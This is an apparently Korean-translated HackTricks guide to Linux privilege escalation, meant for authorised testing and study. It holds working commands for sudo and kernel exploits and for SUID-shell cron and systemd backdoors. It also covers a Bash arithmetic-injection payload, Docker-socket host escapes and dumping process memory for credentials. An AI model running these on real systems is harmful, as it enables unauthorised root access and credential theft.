# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

운영 중인 OS에 대한 정보를 수집해보자
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

만약 **`PATH` 변수 안의 어떤 폴더에 쓰기 권한이 있다면** 일부 라이브러리나 바이너리를 하이재킹할 수 있습니다:
```bash
echo $PATH
```
### Env 정보

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel 버전을 확인하고 해당 버전에서 privileges를 escalate할 수 있는 exploit이 있는지 확인하세요
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
좋은 취약한 커널 목록과 일부 이미 **compiled exploits**를 다음에서 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
다른 사이트들에서도 일부 **compiled exploits**를 찾을 수 있습니다: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 웹에서 모든 취약한 커널 버전을 추출하려면 다음을 수행할 수 있습니다:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits를 검색하는 데 도움이 될 수 있는 도구는:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim에서 실행, kernel 2.x에 대한 exploit만 검사)

항상 **Google에서 kernel 버전을 검색하세요**, 해당 kernel 버전이 어떤 kernel exploit에 적혀 있을 수 있으므로 그 exploit가 유효한지 확실히 알 수 있습니다.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

다음에 나타나는 취약한 sudo 버전을 기반으로:
```bash
searchsploit sudo
```
이 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

작성자: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**smasher2 box of HTB**에서 이 vuln이 어떻게 악용될 수 있는지에 대한 **예시**를 확인하세요
```bash
dmesg 2>/dev/null | grep "signature"
```
### 더 많은 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어책 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

docker container 내부에 있다면 탈출을 시도할 수 있습니다:


{{#ref}}
docker-security/
{{#endref}}

## 드라이브

어디에 무엇이 **mounted and unmounted** 되어 있는지, 그리고 그 이유를 확인하세요. 만약 어떤 것이 unmounted 상태라면 그것을 mount하여 개인 정보를 확인해보세요
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리 열거
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한, **any compiler is installed**인지 확인하세요. 이는 kernel exploit을 사용해야 하는 경우 유용합니다. 사용할 머신(또는 유사한 머신)에서 그것을 compile하는 것이 권장됩니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 설치된 취약 소프트웨어

설치된 패키지와 서비스의 **버전**을 확인하세요. 예를 들어 오래된 Nagios 버전이 있어 권한 상승에 악용될 수 있습니다…\
더 의심스러운 설치된 소프트웨어의 버전은 수동으로 확인하는 것을 권장합니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
머신에 SSH 접근 권한이 있다면, 머신 내부에 설치된 오래되었거나 취약한 소프트웨어를 확인하기 위해 **openVAS**를 사용할 수도 있습니다.

> [!NOTE] > _이 명령들은 대부분 쓸모없는 많은 정보를 출력할 수 있으므로, 설치된 소프트웨어 버전이 알려진 익스플로잇에 취약한지 확인해주는 OpenVAS 같은 도구를 사용하는 것이 권장됩니다_

## 프로세스

실행 중인 **프로세스들**을 살펴보고, 어떤 프로세스가 **정상보다 더 높은 권한**으로 실행되고 있는지 확인하세요 (예: tomcat이 root로 실행되고 있을 수 있음?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
또한 프로세스 바이너리에 대한 권한을 확인하세요. 누군가의 바이너리를 덮어쓸 수 있을지도 모릅니다.

### Process monitoring

프로세스를 모니터링하기 위해 [**pspy**](https://github.com/DominicBreuker/pspy) 같은 도구를 사용할 수 있습니다. 이는 취약한 프로세스가 자주 실행되거나 특정 조건이 충족될 때 이를 식별하는 데 매우 유용할 수 있습니다.

### Process memory

서버의 일부 서비스는 메모리 안에 **credentials in clear text inside the memory**로 저장합니다.\
일반적으로 다른 사용자가 소유한 프로세스의 메모리를 읽으려면 **root privileges**가 필요하므로, 이는 보통 이미 root일 때 더 많은 credentials를 찾는 데 유용합니다.\
하지만 일반 사용자로서는 자신이 소유한 프로세스의 메모리를 읽을 수 있다는 것을 기억하세요. **as a regular user you can read the memory of the processes you own**

> [!WARNING]
> 요즘 대부분의 머신은 기본적으로 **ptrace를 허용하지 않습니다**, 즉 권한이 낮은 사용자가 소유한 다른 프로세스를 덤프할 수 없습니다.
>
> 파일 _**/proc/sys/kernel/yama/ptrace_scope**_ 는 ptrace의 접근성을 제어합니다:
>
> - **kernel.yama.ptrace_scope = 0**: 같은 uid를 가진 모든 프로세스를 디버그할 수 있습니다. 이는 ptracing이 작동하던 전통적인 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 오직 부모 프로세스만 디버그될 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: ptrace를 사용하려면 CAP_SYS_PTRACE 권한이 필요하므로 오직 admin만 사용할 수 있습니다.
> - **kernel.yama.ptrace_scope = 3**: ptrace로 추적할 수 있는 프로세스가 없습니다. 일단 설정되면 ptracing을 다시 가능하게 하려면 재부팅이 필요합니다.

#### GDB

예를 들어 FTP 서비스의 메모리에 접근할 수 있다면 Heap을 얻어 그 안의 credentials를 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해, **maps는 해당 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되는지 보여주며**, 또한 **각 매핑된 영역의 권한을 보여줍니다**. 가상 파일인 **mem**은 **프로세스의 메모리 자체를 노출합니다**. **maps** 파일로부터 어떤 **메모리 영역이 읽기 가능한지**와 그 오프셋을 알 수 있습니다. 이 정보를 사용해 **mem 파일로 이동(seek)하여 모든 읽기 가능한 영역을 덤프(dump)**하고 파일로 저장합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **물리적** 메모리에 접근을 제공하며, 가상 메모리는 아닙니다. 커널의 가상 주소 공간은 /dev/kmem을 사용하여 접근할 수 있습니다.\
일반적으로, `/dev/mem`은 **root** 및 **kmem** 그룹만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump는 Windows용 Sysinternals 툴 모음의 고전적인 ProcDump 도구를 Linux용으로 재구상한 것입니다. 다음에서 확인할 수 있습니다: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_수동으로 root 요구사항을 제거하고 본인이 소유한 프로세스를 덤프할 수 있습니다
- Script A.5는 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root 권한이 필요합니다)

### 프로세스 메모리에서 자격 증명

#### 수동 예제

authenticator 프로세스가 실행 중이면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스를 덤프할 수 있습니다 (이전 섹션을 참조하여 프로세스 메모리를 덤프하는 다양한 방법을 확인하세요) 그리고 메모리 내에서 자격 증명을 검색하세요:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 메모리와 일부 잘 알려진 파일들에서 평문 자격 증명을 훔칩니다. 정상적으로 작동하려면 root 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 예약된/Cron 작업

예약된 작업 중 취약점이 있는지 확인하세요. 루트(root)로 실행되는 스크립트를 이용할 수 있을지도 모릅니다 (wildcard vuln? root가 사용하는 파일을 수정할 수 있나? symlinks를 사용하나? root가 사용하는 디렉터리에 특정 파일을 생성하나?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 경로

예를 들어, _/etc/crontab_ 안에서 다음과 같은 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_'user' 계정이 /home/user에 대해 쓰기 권한을 가지고 있는 점에 주목하세요_)

이 crontab에서 root 사용자가 PATH를 설정하지 않고 어떤 명령이나 스크립트를 실행하려고 하면. 예: _\* \* \* \* root overwrite.sh_\
그러면, 다음을 사용해 root shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

root로 실행되는 스크립트에 명령 안에 “**\***”가 있다면, 이를 악용해 예상치 못한 동작(예: privesc)을 유발할 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**wildcard가 경로(예:** _**/some/path/\***_ **) 앞에 있으면, 취약하지 않습니다 (심지어** _**./\***_ **도 아닙니다).**

더 많은 wildcard exploitation tricks는 다음 페이지를 참고하세요:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash는 ((...)), $((...)) 및 let에서 산술 평가 전에 parameter expansion과 command substitution을 수행합니다. 만약 root cron/parser가 신뢰할 수 없는 로그 필드를 읽어 산술 컨텍스트로 전달하면, 공격자는 cron이 실행될 때 root로 실행되는 command substitution $(...)을 주입할 수 있습니다.

- 왜 작동하는가: Bash에서 확장은 다음 순서로 발생합니다: parameter/variable expansion, command substitution, arithmetic expansion, 그 다음 word splitting과 pathname expansion. 따라서 `$(/bin/bash -c 'id > /tmp/pwn')0` 같은 값은 먼저 치환되어(명령이 실행됨), 남은 숫자 `0`이 산술에 사용되어 스크립트가 오류 없이 계속됩니다.

- 일반적인 취약 패턴:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 공격 방법: 공격자가 제어하는 텍스트를 파싱되는 로그에 기록하게 하여 숫자처럼 보이는 필드에 command substitution을 포함하고 끝이 숫자 형태가 되게 합니다. 산술이 유효하도록 명령이 stdout으로 출력하지 않게 하거나(또는 리다이렉트) 출력이 없도록 하세요.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

만약 root가 실행하는 **cron script를 수정할 수 있다면**, 아주 쉽게 shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root에 의해 실행되는 script가 **사용자에게 완전한 접근 권한이 있는 directory**를 사용한다면, 해당 폴더를 삭제하고 **다른 폴더로 symlink 폴더를 생성**하여 당신이 제어하는 script를 제공하도록 만드는 것이 유용할 수 있습니다.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 자주 실행되는 cron jobs

프로세스를 모니터링하여 1, 2 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 이용해 escalate privileges를 수행할 수 있을지도 모릅니다.

예를 들어, **1분 동안 0.1초마다 모니터링**, **실행 횟수가 적은 명령어 기준으로 정렬**하고 가장 많이 실행된 명령어를 삭제하려면, 다음과 같이 할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**다음도 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이 도구는 시작되는 모든 프로세스를 모니터하고 나열합니다).

### 보이지 않는 cron jobs

주석 뒤에 **carriage return을 넣는** 방식으로 (without newline character) cronjob을 만들 수 있으며, cron job은 정상적으로 작동합니다. 예시 (참고: carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

어떤 `.service` 파일에 쓸 수 있는지 확인하세요. 가능하다면 해당 파일을 **수정하여** 서비스가 **시작될 때**, **재시작될 때** 또는 **중지될 때** 당신의 **백도어를 실행**하도록 만들 수 있습니다(기계를 재부팅할 때까지 기다려야 할 수도 있습니다).\
예를 들어 .service 파일 안에 백도어를 생성할 때 **`ExecStart=/tmp/script.sh`**를 사용할 수 있습니다.

### 쓰기 가능한 서비스 바이너리

서비스에서 실행되는 바이너리에 대해 **쓰기 권한이 있는 경우**, 이를 백도어로 변경할 수 있으므로 서비스가 재실행될 때 백도어가 실행됩니다.

### systemd PATH - 상대 경로

다음 명령으로 **systemd**가 사용하는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 어느 폴더에든 **write** 할 수 있음을 발견하면 **escalate privileges** 할 수 있습니다. 다음과 같이 서비스 구성 파일에서 **relative paths being used on service configurations**가 사용되는지 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 쓰기 가능한 systemd PATH 폴더 안에 상대 경로 바이너리와 이름이 같은 **executable**을 생성하세요. 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 실행하도록 요청되면, 귀하의 **backdoor**가 실행됩니다(권한 없는 사용자는 보통 서비스를 시작/중지할 수 없지만 `sudo -l`을 사용할 수 있는지 확인하세요).

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers**는 이름이 `**.timer**`로 끝나며 `**.service**` 파일 또는 이벤트를 제어하는 systemd unit 파일입니다. **Timers**는 calendar time 이벤트와 monotonic time 이벤트에 대한 내장 지원을 제공하고 비동기적으로 실행할 수 있기 때문에 cron의 대안으로 사용할 수 있습니다.

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 systemd.unit에 존재하는 항목(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
문서에서 Unit이 무엇인지 다음과 같이 설명합니다:

> 이 타이머가 만료될 때 활성화할 unit입니다. 인수는 접미사가 ".timer"가 아닌 unit 이름입니다. 지정하지 않으면 이 값은 타이머 유닛의 이름과 동일하되 접미사가 다른 service로 기본값이 설정됩니다. (위 참조.) 활성화되는 unit 이름과 timer unit의 이름은 접미사를 제외하고 동일하게 이름을 지정하는 것이 권장됩니다.

따라서 이 권한을 악용하려면 다음이 필요합니다:

- systemd unit(예: `.service`) 중에서 **쓰기 가능한 바이너리**를 실행하고 있는 것을 찾습니다
- **상대 경로를 실행하는** systemd unit을 찾고, 해당 실행파일을 가장할 수 있도록 **systemd PATH**에 대해 **쓰기 권한**을 가지고 있어야 합니다

Learn more about timers with `man systemd.timer`.

### **타이머 활성화**

타이머를 활성화하려면 root 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## 소켓

Unix Domain Sockets (UDS)은 클라이언트-서버 모델 내에서 동일하거나 다른 머신 간의 **프로세스 간 통신**을 가능하게 합니다. 이들은 표준 Unix 디스크립터 파일을 이용해 컴퓨터 간 통신을 수행하며 `.socket` 파일을 통해 설정됩니다.

소켓은 `.socket` 파일을 사용해 구성할 수 있습니다.

**`man systemd.socket`로 소켓에 대해 더 알아보세요.** 이 파일 안에는 구성할 수 있는 여러 흥미로운 매개변수가 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 서로 다르지만 요약하면 소켓이 어디에서 수신(listen)할지를 **지정**하는 데 사용됩니다(예: AF_UNIX 소켓 파일의 경로, 수신할 IPv4/6 및/또는 포트 번호 등).
- `Accept`: boolean 인자를 받습니다. **true**인 경우, **들어오는 각 연결마다 서비스 인스턴스가 생성**되며 해당 연결 소켓만 전달됩니다. **false**인 경우, 모든 리스닝 소켓 자체가 **시작된 service unit에 전달**되고, 모든 연결을 위해 단 하나의 service unit만 생성됩니다. 이 값은 datagram 소켓과 FIFO에서는 무시되며, 그 경우 단일 service unit이 조건 없이 모든 수신 트래픽을 처리합니다. **기본값은 false**입니다. 성능상의 이유로, 새로운 데몬은 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상 명령줄을 받으며, 각각 리스닝 **소켓**/FIFO가 생성되고 바인드되기 **전** 또는 **후**에 **실행**됩니다. 명령줄의 첫 번째 토큰은 절대 경로의 파일명이여야 하며, 그 뒤에 프로세스 인자가 옵니다.
- `ExecStopPre`, `ExecStopPost`: 리스닝 **소켓**/FIFO가 닫히고 제거되기 **전** 또는 **후**에 **실행되는** 추가 **명령어들**입니다.
- `Service`: 들어오는 트래픽에 대해 **활성화할 service unit의 이름**을 지정합니다. 이 설정은 `Accept=no`인 소켓에만 허용됩니다. 기본값은 소켓과 동일한 이름을 가진 서비스(접미사가 대체된 것)입니다. 대부분의 경우 이 옵션을 사용할 필요는 없습니다.

### Writable .socket files

쓰기 가능한 `.socket` 파일을 찾으면 `[Socket]` 섹션의 시작 부분에 `ExecStartPre=/home/kali/sys/backdoor`와 같은 항목을 **추가**할 수 있으며, 그러면 소켓이 생성되기 전에 백도어가 실행됩니다. 따라서 **아마도 시스템이 재부팅될 때까지 기다려야 할 것**입니다.\
_시스템이 해당 .socket 파일 구성을 사용하고 있어야만 백도어가 실행됩니다_

### Writable sockets

쓰기 가능한 소켓을 **발견**하면 (_여기서는 구성 `.socket` 파일이 아니라 Unix Sockets를 말합니다_), 해당 소켓과 **통신**할 수 있으며 취약점을 악용할 수도 있습니다.

### Unix 소켓 열거
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

다음에 유의하세요: 일부 **sockets listening for HTTP** 요청이 있을 수 있습니다 (_여기서 말하는 것은 .socket 파일이 아니라 unix sockets로 동작하는 파일들입니다_). 다음 명령으로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
만약 socket이 **HTTP 요청에 응답**하면, **통신**할 수 있고 때로는 **취약점을 악용**할 수도 있습니다.

### 쓰기 가능한 Docker Socket

Docker socket(종종 `/var/run/docker.sock`에 위치)는 보호되어야 하는 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹의 구성원에게 쓰기 권한이 있습니다. 이 socket에 대한 쓰기 권한을 가지면 privilege escalation으로 이어질 수 있습니다. 다음은 이것을 수행하는 방법과 Docker CLI를 사용할 수 없을 때의 대체 방법에 대한 설명입니다.

#### **Privilege Escalation with Docker CLI**

Docker socket에 대한 쓰기 권한이 있으면, 다음 명령어들로 privilege escalation을 수행할 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### 기타

Docker CLI가 사용 불가능한 경우에도 Docker socket은 Docker API와 `curl` 명령어로 조작할 수 있다는 점을 기억하세요.

주의: docker socket에 대한 쓰기 권한이 있고 **inside the group `docker`**에 속해 있다면 [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)를 이용할 수 있습니다. 만약 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)라면 해당 서비스도 침해할 수 있습니다.

docker에서 탈출하거나 이를 악용해 권한을 상승시키는 더 많은 방법은 다음에서 확인하세요:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 권한 상승

만약 **`ctr`** 명령을 사용할 수 있다면 다음 페이지를 읽으세요. **권한 상승에 악용할 수 있을지도 모릅니다**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 권한 상승

만약 **`runc`** 명령을 사용할 수 있다면 다음 페이지를 읽으세요. **권한 상승에 악용할 수 있을지도 모릅니다**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션들이 효율적으로 상호작용하고 데이터를 공유할 수 있게 해주는 정교한 **inter-Process Communication (IPC) system**입니다. 현대적인 Linux 시스템을 염두에 두고 설계되어 다양한 형태의 애플리케이션 통신을 위한 강력한 프레임워크를 제공합니다.

이 시스템은 프로세스 간 데이터 교환을 향상시키는 기본적인 IPC를 지원하며, 이는 향상된 **UNIX domain sockets**와 유사합니다. 또한 이벤트나 signal을 브로드캐스트하여 시스템 구성 요소 간의 원활한 통합을 돕습니다. 예를 들어 Bluetooth 데몬의 수신 호출 신호는 음악 플레이어를 자동으로 음소거하도록 트리거할 수 있습니다. 추가로 D-Bus는 원격 객체 시스템을 지원하여 서비스 요청과 메서드 호출을 단순화하고 전통적으로 복잡했던 프로세스를 간소화합니다.

D-Bus는 **allow/deny model**로 동작하며, 매칭되는 정책 규칙들의 누적된 효과에 따라 메시지 권한(메서드 호출, signal 전송 등)을 관리합니다. 이러한 정책들은 버스와의 상호작용을 지정하며, 이 권한들을 악용하면 권한 상승으로 이어질 수 있습니다.

예를 들어 `/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 이런 정책은 root 사용자가 `fi.w1.wpa_supplicant1`을 소유하고, 해당 서비스로 메시지를 보내고, 메시지를 받을 수 있는 권한을 부여하는 내용을 자세히 설명합니다.

